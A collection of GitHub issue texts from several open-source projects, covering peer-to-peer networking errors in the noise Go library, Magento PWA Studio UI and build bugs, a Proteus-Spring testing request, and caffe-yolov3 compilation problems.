				//assert.Fail(t, "Timed out attempting to receive message", "from Node %d for Node %d", i, j)
			}
		}
	}
}
```

 Please add file distribution sharing examples log：
I0910 11:42:08.731264   15248 main1.go:46] Private Key: 79f92dfe6267bcc95d347a0447408bf57c14fb8781e223e273afedbe5248dd12c3206ae6362428246fea928366b993f66d5ce0d938c50a2b36cb91be280cf148
I0910 11:42:08.738208   15248 main1.go:47] Public Key: c3206ae6362428246fea928366b993f66d5ce0d938c50a2b36cb91be280cf148
I0910 11:42:08.741184   15248 plugin.go:32] Setting up NAT traversal for address: kcp://127.0.0.1:3002
I0910 11:42:10.946909   15248 plugin.go:59] Discovered gateway following the protocol UPNP (IG1-IP1).
I0910 11:42:10.946909   15248 plugin.go:61] Internal IP: 192.168.2.102
I0910 11:42:10.946909   15248 plugin.go:62] External IP: 100.100.149.137
I0910 11:42:11.093523   15248 plugin.go:71] External port 60858 now forwards to your local port 3002.
I0910 11:42:11.093523   15248 plugin.go:82] Other peers may connect to you through the address kcp://100.100.149.137:60858.
I0910 11:42:11.094019   15248 network.go:206] Listening for peers on kcp://100.100.149.137:60858.

Why the External IP is not my public network IP？ After leaving a peer for a long period (in our case a day or so) the error below is rapidly logged.
`W1004 15:11:53.124320   14174 network.go:114] i/o timeout` 

Looks like it comes from this block:
```golang
if err := state.writer.Flush(); err != nil {
   log.Warn().Err(err).Msg("")
}

``` Currently if you call `skademlia.DisconnectByAddress()` on address that could not be successfully connected to, it does not remove it from the list of all peers -- which comes from `(*skademlia.Client).AllPeers`, which only consults the local map.

Subsequent calls to `(*skademlia.Table).FindClosest` still find the broken connection in the table/bucket. We would like to use noise in our p2p application, and we noticed that there is a v2 branch. Could you tell us whether we should use the master branch, the latest release (v1.1), or the v2 branch? Hi,

Sorry to bother you with this question. Actually I am not sure if your library can be used for my scenario. My scenario is quite simple, I want to detect all computer running my service on a local network. A bit like UPnP/AV that are able to discover media servers on the network.

So I've tried your examples (e.g. the chat) but in my scenario I just want to list the peers (their IP addresses) at the moment, I don't want to connect to them. So I got rid of everything related to messaging and Dial from the code. But then `skademlia.FindNode(...)` returns an empty array. In your example, it looks like you know in advance that a peer would run on localhost so you can connect to it, you don't discover it. when I blank protocol it's fine, when use protocol=kcp, error reported:
xxxx$ go run main.go -host=192.168.1.102 -peers=kcp://192.168.1.104:3000 -protocol=kcp
2018-10-20T18:28:21+08:00 |WARN| caller=/Users/xxxx/go/src/github.com/perlin-network/noise/network/network.go:116 error="broken pipe"

one more thing, when peer on win10, it exit; ok under macOS and ubuntu I am running into a vgo mod -sync error, that tells me it cannot find:

go: import "github.com/gogo/protobuf/protoc-gen-gogofaster/gocode/src/github.com/golang/mock/mockgen/tests/vendor_dep" ->
	import "a": cannot find module providing package a

I had an issue with protobufs 3.6 not working and versioned down to 3.5.1, that fixed the protobuf issue so maybe there are other versioning issues?

running ubuntu 18.04 https://github.com/perlin-network/noise/blob/cleanup/skademlia/client.go#L167
<---------->
137249745
Our eslint rules don't make any recommendations for `const`. That's because we're missing the `prefer-const` rule. I opened a PR [here](https://github.com/magento-research/magento-eslint/pull/4).

See [this comment](https://github.com/magento-research/pwa-studio/pull/797#discussion_r270098134) for what sparked this work.

After the PR in the `@magento/eslint-config` repo is merged/published we will need to update the dependency in `pwa-studio` and run the linter to make the updates where variables should be `const`.


 **Describe the bug**
When loading the image in the carousel there is a FOUC while the image loads. When selecting a variant of a product there is another FOUC. This occurs because the image is being loaded and we don't use a placeholder image.

**To Reproduce**
Steps to reproduce the behavior:
1. Go to a product page
2. Click on a variant
3. See how the screen jutters while the old image is removed and the new image is rendered after load.

**Expected behavior**
The screen should render a "identically sized" placeholder while the image loads.

**Additional context**
I explored using the `<picture>` element but that seems to handle the scenario of loading different size images but not the placeholder problem.

**Possible solutions**
Use local state and `onLoad` to render a placeholder while we wait.

<!-- Complete the following sections to help us apply appropriate labels! -->
**Please let us know what packages this bug is in regards to:**
- [x] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`
 Per last retro we need to tinker with the github templates!

This should include trimming them down to only the necessary info so that we don't overwhelm contributors. Per last retro we need to tinker with the github templates!

This should include trimming them down to only the necessary info so that we don't overwhelm contributors. <!--
Thank you for taking the time to report this issue!
GitHub Issues should only be created for problems/topics related to this project's codebase.

Before submitting this issue, please make sure you are complying with our Code of Conduct:
https://github.com/magento-research/pwa-studio/blob/develop/.github/CODE_OF_CONDUCT.md

Issues that do not comply with our Code of Conduct or do not contain enough information may be closed at the maintainers' discretion.

Feel free to remove this section before creating this issue.
-->

**Describe the bug**
DLG_FLAGS_SEC_CERT_CN_INVALID when visiting pwastudio.io

**To Reproduce**
Steps to reproduce the behavior:
1. Go to pwastudio.io
2. See error

Since it appears to be a permanent redirect, you may need to clear browser or DNS cache depending on your env.

**Expected behavior**
A redirect to https://magento-research.github.io/pwa-studio/ should happen seamlessly.

**Additional context**
Or maybe add a new/updated cert?
 Issue to track all activity for PWA 2.1.0 Release. (Based off activities on #923)

Current Action Items:

RTM
- [x] Author & Merge Release Notes to ./changelog.md : @jcalcaben
- [x] Commit Release Notes: @jcalcaben @zetlen @jimbo
- [x] Approve/signoff build: @zetlen @jimbo @dpatil-magento
- [x] Deploy to now.sh: @zetlen 
- [x] Verify now.sh deploys & scale configuration: @zetlen
- [x] Deploy to Magento Cloud: @bbatsche @tjwiebell 
- [x] Verify Cloud deploys: @bbatsche @tjwiebell and any Cloud ops personnel

GA
- [x] In Github, create release from tag v2.1.0: @zetlen @jimbo
- [x] Push the release tag to the repo
- [x] Merge release 2.1.0 to master
- [x] Copy CHANGELOG to Github release details : @zetlen @jimbo
- [x] Publish devdocs: @jcalcaben
- [x] Publish to NPM/package managers: @zetlen
- [x] Rebase all outstanding PRs on develop @sirugh 
 <!--
Thank you for taking the time to report this issue!
GitHub Issues should only be created for problems/topics related to this project's codebase.

Before submitting this issue, please make sure you are complying with our Code of Conduct:
https://github.com/magento-research/pwa-studio/blob/develop/.github/CODE_OF_CONDUCT.md

Issues that do not comply with our Code of Conduct or do not contain enough information may be closed at the maintainers' discretion.

Feel free to remove this section before creating this issue.
-->

**Describe the bug**
The header buttons are not spaced evenly. The center icon has no padding while the buttons to the right have left padding. This is probably because the header uses `grid-template: 1fr auto 1fr` so the center icon takes up only the space it needs.

**To Reproduce**
Steps to reproduce the behavior:
Open Venia and check out the header. You'll see what I mean.

**Expected behavior**
Header icons are spaced evenly

**Screenshots**
[![Image from Gyazo](https://i.gyazo.com/c9860dffb8d45a02218a11d7ad8301e1.png)](https://gyazo.com/c9860dffb8d45a02218a11d7ad8301e1)

**Please complete the following device information:**
 - Device: [e.g. iPhone6, PC] Mac
 - OS: [e.g. iOS8.1, Windows 10] SX
 - Browser [e.g. stock browser, safari] Chrome
 - Venia Version [e.g. 22] `develop`
 - Magento Version `2.3.1`

**Please let us know what packages this bug is in regards to:**
- [ ] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

**Additional context**
Add any other context about the problem here.

**Possible solutions**
Add any ideas about possible solutions to the problem here.
 <!-- (REQUIRED) What is the nature of this issue? -->

On the Product Display Page when a product has color options/configurations and swatches are displayed, selecting a color does not correctly display a tooltip for color name. 

Issue 19: https://wiki.corp.magento.com/display/FF/Venia+UX+Issues

## This issue is for the following packages:

- [x ] `venia-concept`
- [ ] `pwa-buildpack`
- [x ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

## This issue is a:

- [x ] Bug
- [ ] Feature suggestion
- [ ] Documentation issue
- [ ] Other (Please Specify)
 I run the "yarn run build" command and  I faced that given below issue. Please help me out. Thanks:-

```
:/var/www/html/magento23/pwa-studio$ yarn run build
yarn run v1.15.2
$ yarn workspaces run build
$ echo 'Skipping graphql-cli-validate-magento-pwa-queries build...'
Skipping graphql-cli-validate-magento-pwa-queries build...
$ concurrently --raw yarn:build:cjs yarn:build:esm
$ BABEL_ENV=development babel src --out-dir esm --root-mode 'upward' --source-maps
$ BABEL_ENV=production babel src --out-dir dist --root-mode 'upward' --source-maps
Successfully compiled 32 files with Babel.
Successfully compiled 49 files with Babel.
$ yarn run clean
$ rimraf dist
$ babel src --out-dir dist --root-mode 'root' --source-maps --copy-files
Successfully compiled 16 files with Babel.
$ yarn run clean && yarn run build:esm && yarn run validate-queries && yarn run build:prod
$ rimraf dist esm
$ BABEL_ENV=development babel src --out-dir esm --root-mode 'upward' --source-maps --copy-files
Successfully compiled 290 files with Babel.
$ yarn run download-schema && graphql validate-magento-pwa-queries --project venia
$ graphql get-schema --project venia
⚠ maximum redirect reached at: http://magento.local2/admin_rx200y/admin/index/index/key/d82ea5208d0cc660efbf78d01e078c0004844e19a1ad9079f8d58196170a9eea/
Validating GraphQL queries in venia project...
✖ An error occurred:
Could not find a schema at lastCachedGraphQLSchema.json.
 Run 'graphql get-schema --project venia' to download the schema before running validate-magento-pwa-queries.
error Command failed with exit code 1.
info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.
error Command failed with exit code 1.
info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.
error Command failed.
Exit code: 1
Command: /usr/bin/node
Arguments: /usr/share/yarn/lib/cli.js build
Directory: /var/www/html/magento23/pwa-studio/packages/venia-concept
Output:

info Visit https://yarnpkg.com/en/docs/cli/workspaces for documentation about this command.
error Command failed with exit code 1.
info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.`
```

**Screenshots**
![Screenshot from 2019-03-22 21-54-52](https://user-images.githubusercontent.com/46247890/54837848-5f385c00-4ced-11e9-833b-399585d17469.png)
![Screenshot from 2019-03-22 21-55-56](https://user-images.githubusercontent.com/46247890/54837849-5f385c00-4ced-11e9-9d16-36cef943ad6b.png)


**Please complete the following device information:**
 - Magento Version - 2.3
-  Yarn v 1.15.2
 - NPM version `npm -v` - 6.7
 - Node Version `node -v` - 11.12

 **Describe the bug**
I'm trying to see how I can use Venia components in a simple react app by following the [Modular components docs] and using _Create React App_. But I get two errors, the first I can fix by updating how CSS Modules are configured in my react app, but there is a second error I come to which I can't fix...

```bash
Failed to compile.

./node_modules/@magento/venia-concept/esm/components/CategoryList/categoryList.js
Module not found: Can't resolve '@magento/venia-drivers' in 'my-venia-adapter/node_modules/@magento/venia-concept/esm/components/CategoryList'
```

**To Reproduce**
Steps to reproduce the behavior:
1. Install a simple React app with create-react-app, eject the webpack configuration and add dependencies for magento, redux & apollo packages.
```bash
npx create-react-app my-venia-adapter
cd my-venia-adapter
yarn eject
yarn add @magento/venia-concept
yarn add redux
yarn add apollo-boost react-apollo graphql --save
```
2. Based on the [venia adapter example in the docs], update the _src/App.js_ file with the following:
```javascript
import React, { Component } from 'react';
import VeniaAdapter from '@magento/venia-concept/esm/drivers/adapter';
import CategoryList from '@magento/venia-concept/esm/components/CategoryList';
import { createStore } from 'redux';
import { ApolloClient } from 'apollo-client';

const myApplicationStore = createStore()
const myClient = new ApolloClient({ uri: "https://veniapwa.com/graphql"})

class App extends Component {
  render() {
    return (
      <VeniaAdapter client={myClient} store={myApplicationStore} apiBase="https://veniapwa.com/graphql">
        <CategoryList title="Shop by category" id={2} />
      </VeniaAdapter>
    );
  }
}

export default App;
```
3. Run the following command:
``` bash
yarn start
Failed to compile.

./node_modules/@magento/venia-concept/esm/components/CategoryList/categoryList.css (./node_modules/css-loader??ref--6-oneOf-3-1!./node_modules/postcss-loader/src??postcss!./node_modules/@magento/venia-concept/esm/components/CategoryList/categoryList.css)
Error: composition is only allowed when selector is single :local class name not in ".noResults", ".noResults" is weird
    at Array.map (<anonymous>)
```
4. Fix the error above by updating _config/webpack.config.js_
```diff
 // style files regexes
 const cssRegex = /\.css$/;
-const cssModuleRegex = /\.module\.css$/;
+// const cssModuleRegex = /\.module\.css$/;
 const sassRegex = /\.(scss|sass)$/;
 const sassModuleRegex = /\.module\.(scss|sass)$/;
 
@@ -388,23 +388,23 @@ module.exports = function(webpackEnv) {
             // to a file, but in development "style" loader enables hot editing
             // of CSS.
             // By default we support CSS Modules with the extension .module.css
-            {
-              test: cssRegex,
-              exclude: cssModuleRegex,
-              use: getStyleLoaders({
-                importLoaders: 1,
-                sourceMap: isEnvProduction && shouldUseSourceMap,
-              }),
-              // Don't consider CSS imports dead code even if the
-              // containing package claims to have no side effects.
-              // Remove this when webpack adds a warning or an error for this.
-              // See https://github.com/webpack/webpack/issues/6571
-              sideEffects: true,
-            },
+            // {
+            //   test: cssRegex,
+            //   exclude: cssModuleRegex,
+            //   use: getStyleLoaders({
+            //     importLoaders: 1,
+            //     sourceMap: isEnvProduction && shouldUseSourceMap,
+            //   }),
+            //   // Don't consider CSS imports dead code even if the
+            //   // containing package claims to have no side effects.
+            //   // Remove this when webpack adds a warning or an error for this.
+            //   // See https://github.com/webpack/webpack/issues/6571
+            //   sideEffects: true,
+            // },
             // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
             // using the extension .module.css
             {
-              test: cssModuleRegex,
+              test: cssRegex,
               use: getStyleLoaders({
                 importLoaders: 1,
                 sourceMap: isEnvProduction && shouldUseSourceMap,
```
5. Try to start the react app again and see new error:
```bash
yarn start

Failed to compile.

./node_modules/@magento/venia-concept/esm/components/CategoryList/categoryList.js
Module not found: Can't resolve '@magento/venia-drivers' in 'my-venia-adapter/node_modules/@magento/venia-concept/esm/components/CategoryList'
```

**Expected behavior**
To see workable example of the Venia Adapter displaying a Category List from the _@magento/venia-concept_ package, similar to what is seen on the homepage of [veniapwa.com].

**Additional context**
The [Modular components docs] and  [Venia Consumer Example] both suggest an alternative way of using Venia components with **custom drivers**, however I'm trying to get it to work with the Venia Adapter by itself.  Nevertheless I tried to use a custom driver, as described below, but it did not work.

**Possible solutions**
I tried adding a [custom driver from the docs] and also the [driver from the venia consumer example], neither worked and gave the [error described here]. Nevertheless I would prefer to get the VeniaAdapter working rather than use a custom adapter.

**Please complete the following device information:**
- OS X 10.14.1
- Chrome 73.0.3683.86
- node v11.10.1
- yarn v1.13.0
- npm v6.7.0

<!-- Complete the following sections to help us apply appropriate labels! -->
**Please let us know what packages this bug is in regards to:**
- [ ] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

[Modular components docs]: https://magento-research.github.io/pwa-studio/venia-pwa-concept/features/modular-components/
[venia adapter example in the docs]: https://magento-research.github.io/pwa-studio/venia-pwa-concept/features/modular-components/#venia-adapter
[veniapwa.com]: https://veniapwa.com/
[Venia Consumer Example]: https://github.com/magento-research/venia-consumer-example
[custom driver from the docs]: https://magento-research.github.io/pwa-studio/venia-pwa-concept/features/modular-components/#custom-drivers
[driver from the venia consumer example]: https://github.com/magento-research/venia-consumer-example/blob/master/src/veniaDrivers.js
[error described here]: https://github.com/magento-research/venia-consumer-example/issues/1   <!--
Thank you for taking the time to report this issue!
GitHub Issues should only be created for problems/topics related to this project's codebase.

Before submitting this issue, please make sure you are complying with our Code of Conduct:
https://github.com/magento-research/pwa-studio/blob/develop/.github/CODE_OF_CONDUCT.md

Issues that do not comply with our Code of Conduct or do not contain enough information may be closed at the maintainers' discretion.

Feel free to remove this section before creating this issue.
-->

The frame **(outline)** appears when clicking on the button (search icon and etc.).

**To Reproduce**
Steps to reproduce the behavior:
1. Go to 'Home'
2. Click on 'Search'
3. See bug

**Expected behavior**
The behavior when clicking on the elements, must be all exactly the same.

**Screenshots**

Dedicated search: (Dekstop)

![Screenshot from 2019-03-13 13-32-29](https://user-images.githubusercontent.com/46525772/54275887-790ecc00-4594-11e9-897b-921ff1f40d93.png)

On iPhone 6/7/8:

![Screenshot from 2019-03-13 13-33-55](https://user-images.githubusercontent.com/46525772/54275953-b07d7880-4594-11e9-8d4d-6ebe1aa08fe4.png)

**Environment:**
 - Device: iPhone6/7/8, PC
 - OS: Ubuntu
 - Browser Chrome
 - Version 72.0.3626.81
 - NPM version `6.7.0`
 - Node Version `10.15.1`

**Please let us know what packages this bug is in regards to:**
- [X] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

**Possible solutions**
Remove the frame from the element.
 **Describe the bug**
HTML special characters like `&trade;` are not appearing properly on category and product detail page.

**To Reproduce**
1. Login into Magento 2 Backend
2. Goto 'Catalog > Products'
3. Search 'Carmina Earrings' product
4. Edit the product and replace the product name with `Carmina Earrings &trade;`
5. Now goto pwa studio's root directory and run the server `yarn run watch:venia`.
6. In navigation menu, click on *Accessories* menu and then open `Carmina Earrings` product.

**Expected behavior**
The product name should look like: `Carmina Earrings ™` instead of `Carmina Earrings &trade;`.

**Screenshots**
![screenshot_list](https://user-images.githubusercontent.com/783102/53713817-38b39d80-3e72-11e9-9d7b-74d27bfb31fa.png)
![screenshot_product_view](https://user-images.githubusercontent.com/783102/53713819-3cdfbb00-3e72-11e9-9fe0-45a47d81ba64.png)


**Please complete the following device information:**
 - Device: [e.g. iPhone6, PC]
 - OS: [e.g. iOS8.1, Windows 10]
 - Browser [e.g. stock browser, safari]
 - Version [e.g. 22]
 - Magento Version
 - NPM version `npm -v`
 - Node Version `node -v`

**Please let us know what packages this bug is in regards to:**
- [x] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

**Additional context**
Add any other context about the problem here.

**Possible solutions**
Add any ideas about possible solutions to the problem here. **Describe the bug**
In the Venia Storefront in a mobile view the page requests the thumbnail images unnecessarily.

In the following screenshot you can see the displayed image (640px) but you also can see the two thumbnails (240px) being requested.
[![Image from Gyazo](https://i.gyazo.com/9be2b5a1a6911bc062c9a9884dc3a683.png)](https://gyazo.com/9be2b5a1a6911bc062c9a9884dc3a683)

**To Reproduce**
Steps to reproduce the behavior:
1. Open a PDP in mobile view with the network tab open.
2. See that large (~640) and small (~240) images are requested.

**Expected behavior**
Only the necessary images are requested. On Desktop that would be large & small images but on mobile that should only be the large images.

**Please complete the following device information:**
 - Device: Macbook Pro
 - OS: Mojave
 - Browser: Chrome
 - Version [e.g. 22]
 - Magento Version: 2.3.1
 - NPM version `npm -v` 6.7.0
 - Node Version `node -v` 11.6.0

**Please let us know what packages this bug is in regards to:**
- [x] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

**Possible solutions**
Avoid mounting thumbnail components when viewport is below a certain width.
 Hi,
 I am facing an issue when I try to run 
"yarn run build"
Issue: Consider updating your .env file or environment variables to resolve the reported issues.

Setup: 
Magento 2.3
yarn 1.13

-------------------------Error -----------------------------------
Using environment variables from .env
Validating queries based on schema at http://pwamagento.local/graphql...
Unexpected token < in JSON at position 209029

The current default backend for Venia development is:

	https://release-dev-rxvv2iq-zddsyhrdimyra.us-4.magentosite.cloud/

The configured MAGENTO_BACKEND_URL in the current environment is

	http://pwamagento.local/

Consider updating your .env file or environment variables to resolve the reported issues.
error Command failed with exit code 1.
info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.
error Command failed with exit code 1.
info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.
error Command failed.
Exit code: 1
Command: /home/lenovo/.nvm/versions/node/v10.7.0/bin/node
Arguments: /home/lenovo/.nvm/versions/node/v10.7.0/lib/node_modules/yarn/lib/cli.js build
Directory: /var/www/pwa-studio/packages/venia-concept
Output:

info Visit https://yarnpkg.com/en/docs/cli/workspaces for documentation about this command.
error Command failed with exit code 1.
info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.

 <!--
Thank you for taking the time to report this issue!
GitHub Issues should only be created for problems/topics related to this project's codebase.

Before submitting this issue, please make sure you are complying with our Code of Conduct:
https://github.com/magento-research/pwa-studio/blob/develop/.github/CODE_OF_CONDUCT.md

Issues that do not comply with our Code of Conduct or do not contain enough information may be closed at the maintainers' discretion.

Feel free to remove this section before creating this issue.
-->

**Describe the bug**
When i run `npm run build` it gives the syntax error.

```js
> @magento/pwa-studio@2.0.0 build /home/mahesh-pwa/www/pwa1/pwa-studio
> yarn workspaces run build

yarn workspaces v1.13.0
yarn run v1.13.0
$ concurrently --raw yarn:build:cjs yarn:build:esm
$ BABEL_ENV=development babel src --out-dir esm --root-mode 'upward' --source-maps
$ BABEL_ENV=production babel src --out-dir dist --root-mode 'upward' --source-maps
SyntaxError: src/ContainerChild/ContainerChild.js: Unexpected token (10:21)
   8 | 
   9 | export default class ContainerChild extends Component {
> 10 |     static propTypes = {
     |                      ^
  11 |         id: string.isRequired,
  12 |         render: func.isRequired
  13 |     };
error Command failed with exit code 1.

```

**To Reproduce**
Steps to reproduce the behavior:
1. Setup venia as given: https://magento-research.github.io/pwa-studio/venia-pwa-concept/setup/ 

**Expected behavior**
A clear and concise description of what you expected to happen.

**Screenshots**
If applicable, add screenshots to help explain your problem.

**Please complete the following device information:**
 OS: Ubuntu
 - Magento Version 2.3
 - NPM version`v8.11.2` 
 - Node Version  `v5.6.0`

**Please let us know what packages this bug is in regards to:**
- [x] `venia-concept`
- [ ] `pwa-buildpack`
- [x] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

**Additional context**
Add any other context about the problem here.

**Possible solutions**
Add any ideas about possible solutions to the problem here.
 <!-- (REQUIRED) What is the nature of this issue? -->

Once the shopper taps into the checkout drawer, they should enter a "full screen" overlay where the shopping cart header is not seen.

Issues should be resolved to adhere to current design:  https://magento.invisionapp.com/share/HVP22925B2Q

## This issue is for the following packages:

- [x] `venia-concept`
- [ ] `pwa-buildpack`
- [ ] `peregrine`
- [ ] `pwa-devdocs`
- [ ] `upward-js`
- [ ] `upward-spec`

## This issue is a:

- [x] Bug
- [ ] Feature suggestion
- [ ] Documentation issue
- [ ] Other (Please Specify)
 Write unit tests for `SearchBar` component directory.
 Write unit tests for `SearchBar` component directory.

<---------->
137416469
What I found during writing/testing Proteus-Spring application is the lack of proper test-kit that allows to easily mock broker (possibly avoid it at all) and mock Proteus instance so the testing of the generated client/server can be setup in a few steps. 

For now, to test the app, I have to do something like the following:

```java
@RunWith(SpringRunner.class)
@SpringBootTest
public class UserAccessServiceApplicationTest {
    @Destination(group = "test", destination = "test")
    AccessKeyInfoServiceClient accessKeyInfoServiceClient;
    ...
    @TestConfiguration
    public static class TestConfig {

        @Bean
        public Proteus proteus() {
            Proteus proteus = Mockito.mock(Proteus.class);

            RequestHandlingRSocket requestHandlingRSocket = new RequestHandlingRSocket();
            Mockito.when(proteus.getAccesskey()).thenReturn(1L);
            Mockito.when(proteus.getGroupName()).thenReturn("test");
            Mockito.when(proteus.getDestination()).thenReturn("test");
            Mockito.when(proteus.addService(Mockito.any()))
                   .thenAnswer(a -> {
                       requestHandlingRSocket.addService(a.getArgument(0));
                       return proteus;
                   });
            Mockito.when(proteus.destination(Mockito.anyString(), Mockito.anyString()))
                   .thenReturn(new DefaultProteusSocket(Payload::retain, () -> requestHandlingRSocket));
            Mockito.when(proteus.group(Mockito.anyString()))
                   .thenReturn(new DefaultProteusSocket(Payload::retain, () -> requestHandlingRSocket));
            Mockito.when(proteus.onClose()).thenReturn(Mono.never());

            return proteus;
        }
    }

}
```

What I would like to see is something similar to annotation based test env setup like one in spring web -> `@WebFluxTest`/`@WebMvcTest`
<---------->
137423311
from cfg import *
from prototxt import *
import failed

where are they from? -- Building for: Visual Studio 14 2015
-- Selecting Windows SDK version 10.0.14393.0 to target Windows 10.0.18362.
-- The C compiler identification is MSVC 19.0.24210.0
-- The CXX compiler identification is MSVC 19.0.24210.0
-- Check for working C compiler: D:/vs2015/VC/bin/cl.exe
-- Check for working C compiler: D:/vs2015/VC/bin/cl.exe -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: D:/vs2015/VC/bin/cl.exe
-- Check for working CXX compiler: D:/vs2015/VC/bin/cl.exe -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Found CUDA: C:/Program Files/NVIDIA GPU Computing Toolkit/CUDA/v10.0 (found version "10.0")
-- CUDA 10 detected, enabling SM_72
-- system arch:  AMD64
-- output path:  D:/工作/my/caffe-yolov3/build/AMD64
-- Copying D:/工作/my/caffe-yolov3/activations.h
-- Copying D:/工作/my/caffe-yolov3/blas.h
-- Copying D:/工作/my/caffe-yolov3/box.h
-- Copying D:/工作/my/caffe-yolov3/cuda.h
-- Copying D:/工作/my/caffe-yolov3/image.h
-- Copying D:/工作/my/caffe-yolov3/yolo_layer.h
CMake Error: failed to create symbolic link 'D:/宸ヤ綔/my/caffe-yolov3/build/AMD64/bin/networks': operation not permitted
-- OpenCV ARCH: x86
-- OpenCV RUNTIME: vc14
-- OpenCV STATIC: ON
CMake Warning at D:/openCV/opencv/build/OpenCVConfig.cmake:138 (message):
  Found OpenCV Windows Pack but it has no binaries compatible with your
  configuration.

  You should manually point CMake variable OpenCV_DIR to your build of OpenCV
  library.
Call Stack (most recent call first):
  CMakeLists.txt:79 (FIND_PACKAGE)


-- Configuring done
-- Generating done
-- Build files have been written to: D:/工作/my/caffe-yolov3/build How to generates yolov3_train.prototxt which supports training? - Copying /home/user/daniel_ws/caffe-yolov3-master/box.h
-- Copying /home/user/daniel_ws/caffe-yolov3-master/cuda.h
-- Copying /home/user/daniel_ws/caffe-yolov3-master/image.h
-- Copying /home/user/daniel_ws/caffe-yolov3-master/max_pool_1d.h
-- Copying /home/user/daniel_ws/caffe-yolov3-master/yolo_layer.h
-- Configuring done
-- Generating done
-- Build files have been written to: /home/user/daniel_ws/caffe-yolov3-master/build
[ 80%] Built target sysDetectSpeed
Scanning dependencies of target detectnet
[ 90%] Building CXX object detectnet/CMakeFiles/detectnet.dir/detectnet.cpp.o
/home/user/daniel_ws/caffe-yolov3-master/detectnet/detectnet.cpp:20:30: fatal error: opencv2/opencv.hpp: No such file or directory
compilation terminated.
detectnet/CMakeFiles/detectnet.dir/build.make:62: recipe for target 'detectnet/CMakeFiles/detectnet.dir/detectnet.cpp.o' failed
make[2]: *** [detectnet/CMakeFiles/detectnet.dir/detectnet.cpp.o] Error 1
CMakeFiles/Makefile2:122: recipe for target 'detectnet/CMakeFiles/detectnet.dir/all' failed
make[1]: *** [detectnet/CMakeFiles/detectnet.dir/all] Error 2
Makefile:129: recipe for target 'all' failed
make: *** [all] Error 2
 你说你在windows下测试过，那能不能麻烦您发一下windows下的代码？ I run make command and face these problem, I don't know how to fix it.
[ 10%] Building NVCC (Device) object CMakeFiles/sysDetectSpeed.dir/sysDetectSpeed_generated_max_pool_1d.cu.o
[ 20%] Building NVCC (Device) object CMakeFiles/sysDetectSpeed.dir/sysDetectSpeed_generated_activation_kernels.cu.o
[ 30%] Building NVCC (Device) object CMakeFiles/sysDetectSpeed.dir/sysDetectSpeed_generated_blas_kernels.cu.o
Scanning dependencies of target sysDetectSpeed
make[2]: *** No rule to make target '/usr/lib/x86_64-linux-gnu/libgflags.so.2', needed by 'x86_64/lib/libsysDetectSpeed.so'.  Stop.
make[2]: *** Waiting for unfinished jobs....
[ 40%] Building CXX object CMakeFiles/sysDetectSpeed.dir/box.cpp.o
[ 50%] Building CXX object CMakeFiles/sysDetectSpeed.dir/cuda.cpp.o
[ 60%] Building CXX object CMakeFiles/sysDetectSpeed.dir/image.cpp.o
[ 70%] Building CXX object CMakeFiles/sysDetectSpeed.dir/yolo_layer.cpp.o
/home/administrator/caffe-yolov3/cuda.cpp: In function 'dim3 cuda_gridsize(size_t)':
/home/administrator/caffe-yolov3/cuda.cpp:53:22: warning: narrowing conversion of 'x' from  size_t {aka long unsigned int}' to 'unsigned int' inside { } [-Wnarrowing]
     dim3 d = {x, y, 1};
                      ^
/home/administrator/caffe-yolov3/cuda.cpp:53:22: warning: narrowing conversion of 'y' from  size_t {aka long unsigned int}' to 'unsigned int' inside { } [-Wnarrowing]
CMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/sysDetectSpeed.dir/all' failed
make[1]: *** [CMakeFiles/sysDetectSpeed.dir/all] Error 2
Makefile:129: recipe for target 'all' failed
make: *** [all] Error 2
 需要怎么配置环境 ![2019-10-14 11-13-28屏幕截图](https://user-images.githubusercontent.com/41817353/66727830-296ae880-ee74-11e9-819f-302df71b5995.png)
 basically, I use "./x86_64/bin/detectnet 0 ../../data/yolov3/prototxt/yolov3.prototxt ../../data/yolov3/caffemodel/yolov3.caffemodel" to inference original yolov3 model for  coco dataset is ok
the dog.jpg have the correct box.
but when I do inference for my dataset ,the result is strange .a lot of boxes appear .my dataset only 10 class .
so may I know the detectnet tool can inference other dataset? 
where to config the my label ? Hi, ChenYingpeng, I face the following error when i run the given examples:

[libprotobuf ERROR google/protobuf/text_format.cc:274] Error parsing text-format caffe.NetParameter: 2719:20: Message type "caffe.LayerParameter" has no field named "upsample_param".
WARNING: Logging before InitGoogleLogging() is written to STDERR
F0819 16:18:51.481129 13794 upgrade_proto.cpp:90] Check failed: ReadProtoFromTextFile(param_file, param) Failed to parse NetParameter file: ../../data/yolov3/prototxt/yolov3-spp.prototxt
*** Check failure stack trace: ***
Aborted (core dumped)

can you help me with this problem? thank you a lot when I make the project, I met this error

In file included from /home/jane/Files/caffe/include/caffe/caffe.hpp:7:0,
                 from /home/jane/Files/object_detection/caffe-yolov3/yolo_layer.h:9,
                 from /home/jane/Files/object_detection/caffe-yolov3/box.h:9,
                 from /home/jane/Files/object_detection/caffe-yolov3/box.cpp:1:
